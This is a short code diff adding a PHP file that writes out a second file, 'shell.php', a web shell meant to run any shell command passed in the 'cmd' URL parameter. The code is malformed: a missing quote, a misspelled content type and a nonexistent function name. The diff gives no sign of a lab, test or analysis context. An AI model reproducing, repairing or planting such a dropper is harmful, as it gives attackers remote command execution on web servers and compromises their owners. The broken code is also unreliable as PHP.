@@ -1,0 +1,7 @@
+<?php  
+	file_put_contents('shell.php',<?php  
+					header("Content-Type:  text/palin"); 
+					print_shell_exec($_GET['cmd']); 
+				?> 
+		'); 
+?> 
